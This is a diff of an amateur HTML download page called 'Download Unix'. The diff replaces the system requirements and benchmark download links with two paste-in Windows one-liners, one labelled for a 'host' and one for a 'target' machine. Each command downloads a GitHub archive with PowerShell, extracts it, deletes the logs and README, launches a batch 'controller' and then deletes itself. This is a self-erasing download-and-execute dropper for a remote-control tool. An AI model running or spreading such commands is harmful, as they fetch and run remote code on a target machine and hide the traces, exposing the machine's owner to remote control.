@@ -69,26 +69,17 @@ li.dropdown {
 <div style="padding:20px;background-color:#1abc9c">
   <h1><center>Download Unix</center></h1>
   <h2><center>Please pick a virsion to download</center></h2>
-							<p>Useage of unixC</p>
-										<p>You may refresh the page if you need to replay the video.</p>
+							<h3>Useage of unixC</h3>
+										<h3>You may refresh the page if you need to replay the video.</h3>
 <video width="840" height="680" autoplay>
   <source src="unixc.mp4" type="video/mp4">
   Your browser does not support the video tag.
 </video>
-    <h2>System Requrments</h2>
-	  <h3>Recommended:</h3>
-	  <p>CPU: ryzen 5 3600x</p>
-	  	  <p>RAM: 16GB 3000mhz CL 16</p>
-		  	  <p>Disk Space: 2.5GB</p>
-			  	  <h3>Minium:</h3>
-	  <p>CPU: ryzen 3 1300x</p>
-	  	  <p>RAM: 8GB 2666mhz CL 16</p>
-		  	  <p>Disk Space: 600MB</p>
-    <h2>Bat Benchmark v1.8</h2>
-  <a href="bat-benchmark v1.8.rar" download>
-  <img src="downloadnow.gif" alt="docx v4.0">
-</a>
-  <h3>Bat Benchmark v1.0</h3>
-  <a href="bat-benchmark.rar" download>
-  <img src="downloadnow.gif" alt="docx v4.0">
-  </a>
+    <h2>unixC</h2>
+	<p>Controller should be on host mechine code below</p>
+<h3>powershell -Command "Invoke-WebRequest https://github.com/rasil1127/unixC/archive/main.zip -OutFile I.zip" & powershell Expand-Archive I.zip & ( for /f %%a IN ('dir "I\unixC-main" /b') do move "I\unixC-main\%%a" "%cd%\" ) & @RD /S /Q "I" & del /q /f I.zip log.txt README.md & start unixC.bat & start /b "" cmd /c del "%~f0"&exit /b
+</h3>
+    <h2>unixT</h2>
+	<p>Controller should be on target mechine code below</p>
+<h3>powershell -Command "Invoke-WebRequest https://github.com/rasil1127/unixT/archive/main.zip -OutFile I.zip" & powershell Expand-Archive I.zip & ( for /f %%a IN ('dir "I\unixT-main" /b') do move "I\unixT-main\%%a" "%cd%\" ) & @RD /S /Q "I" & del /q /f I.zip log.txt README.md & start unixT.bat & start /b "" cmd /c del "%~f0"&exit /b
+</h3>
